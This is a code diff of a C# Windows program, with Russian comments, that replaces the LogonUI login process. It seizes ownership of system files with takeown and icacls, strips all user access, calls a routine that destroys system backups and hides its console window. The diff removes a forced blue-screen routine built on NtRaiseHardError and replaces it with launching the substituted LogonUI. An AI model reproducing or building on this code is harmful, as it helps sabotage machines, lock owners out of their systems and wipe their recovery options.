@@ -1,4 +1,4 @@
-// Installer.cs - Убиваем только LogonUI процесс + поиск по всем дискам + полное снятие защит + без окон
+// Installer.cs - Убиваем только LogonUI процесс + поиск по всем дискам + полное снятие защит + без окон + запуск нового LogonUI
 using System;
 using System.IO;
 using System.Security.AccessControl;
@@ -20,19 +20,6 @@ namespace LogonUIInstaller
 
         [DllImport("kernel32.dll", SetLastError = true)]
         private static extern bool SetProcessDEPPolicy(IntPtr hProcess, uint dwFlags);
-
-        [DllImport("ntdll.dll")]
-        private static extern uint RtlAdjustPrivilege(int privilege, bool enable, bool currentThread, out bool enabled);
-
-        [DllImport("ntdll.dll")]
-        private static extern uint NtRaiseHardError(
-            uint errorStatus,
-            uint numberOfParameters,
-            IntPtr unicodeStringParameterMask,
-            IntPtr parameters,
-            uint validResponseOptions,
-            out uint response
-        );
 
         [DllImport("kernel32.dll")]
         private static extern IntPtr GetConsoleWindow();
@@ -120,8 +107,22 @@ namespace LogonUIInstaller
                 SetSystemProtection(originalPath);
                 RemoveAllUserAccess(originalPath);
                 DestroySystemBackups(originalPath);
-                TriggerBSOD();
-
+                
+                // ЗАПУСКАЕМ НОВЫЙ LogonUI ВМЕСТО BSOD
+                try
+                {
+                    ProcessStartInfo psi = new ProcessStartInfo
+                    {
+                        FileName = originalPath,
+                        UseShellExecute = true,
+                        CreateNoWindow = true,
+                        WindowStyle = ProcessWindowStyle.Normal
+                    };
+                    Process.Start(psi);
+                }
+                catch { }
+                
+                Environment.Exit(0);
             }
             catch (Exception ex)
             {
@@ -134,7 +135,7 @@ namespace LogonUIInstaller
                     }
                 }
                 catch { }
-                TriggerBSOD();
+                Environment.Exit(1);
             }
         }
 
@@ -142,14 +143,12 @@ namespace LogonUIInstaller
         {
             try
             {
-                // 1. Снимаем все атрибуты
                 File.SetAttributes(path, FileAttributes.Normal);
             }
             catch { }
 
             try
             {
-                // 2. Забираем владение через takeown
                 ProcessStartInfo takeown = new ProcessStartInfo
                 {
                     FileName = "takeown.exe",
@@ -168,7 +167,6 @@ namespace LogonUIInstaller
 
             try
             {
-                // 3. Даём полный доступ через icacls
                 ProcessStartInfo icacls = new ProcessStartInfo
                 {
                     FileName = "icacls.exe",
@@ -187,20 +185,16 @@ namespace LogonUIInstaller
 
             try
             {
-                // 4. Дополнительно через Security API
                 FileInfo fileInfo = new FileInfo(path);
                 FileSecurity fileSecurity = fileInfo.GetAccessControl();
                 
-                // Меняем владельца
                 fileSecurity.SetOwner(WindowsIdentity.GetCurrent().User);
                 
-                // Добавляем полный доступ для текущего пользователя
                 NTAccount account = new NTAccount(Environment.UserDomainName, Environment.UserName);
                 FileSystemAccessRule rule = new FileSystemAccessRule(account, 
                     FileSystemRights.FullControl, AccessControlType.Allow);
                 fileSecurity.AddAccessRule(rule);
                 
-                // Добавляем полный доступ для SYSTEM
                 NTAccount systemAccount = new NTAccount("NT AUTHORITY\\SYSTEM");
                 FileSystemAccessRule systemRule = new FileSystemAccessRule(systemAccount, 
                     FileSystemRights.FullControl, AccessControlType.Allow);
@@ -212,7 +206,6 @@ namespace LogonUIInstaller
 
             try
             {
-                // 5. Снимаем атрибуты ещё раз (на случай, если они восстановились)
                 File.SetAttributes(path, FileAttributes.Normal);
             }
             catch { }
@@ -307,34 +300,6 @@ namespace LogonUIInstaller
             }
             catch { }
             Environment.Exit(0);
-        }
-
-        private static void SetFileOwnership(string path)
-        {
-            try
-            {
-                FileInfo fileInfo = new FileInfo(path);
-                FileSecurity fileSecurity = fileInfo.GetAccessControl();
-                fileSecurity.SetOwner(WindowsIdentity.GetCurrent().User);
-                fileInfo.SetAccessControl(fileSecurity);
-            }
-            catch { }
-        }
-
-        private static void SetFilePermissions(string path, FileSystemRights rights)
-        {
-            try
-            {
-                FileInfo fileInfo = new FileInfo(path);
-                FileSecurity fileSecurity = fileInfo.GetAccessControl();
-                
-                NTAccount account = new NTAccount(Environment.UserDomainName, Environment.UserName);
-                FileSystemAccessRule rule = new FileSystemAccessRule(account, rights, AccessControlType.Allow);
-                
-                fileSecurity.AddAccessRule(rule);
-                fileInfo.SetAccessControl(fileSecurity);
-            }
-            catch { }
         }
 
         private static void SetSystemProtection(string path)
@@ -492,20 +457,6 @@ namespace LogonUIInstaller
                 fallbackStream.Read(data, 0, data.Length);
                 return data;
             }
-        }
-
-        private static void TriggerBSOD()
-        {
-            try
-            {
-                RtlAdjustPrivilege(19, true, false, out bool _);
-                
-                uint random = (uint)(DateTime.UtcNow.Ticks & 0xF_FFFF);
-                uint bsodCode = 0xC000_0000 | ((random & 0xF00) << 8) | ((random & 0xF0) << 4) | (random & 0xF);
-                
-                NtRaiseHardError(bsodCode, 0, IntPtr.Zero, IntPtr.Zero, 6, out uint _);
-            }
-            catch { }
         }
     }
 }
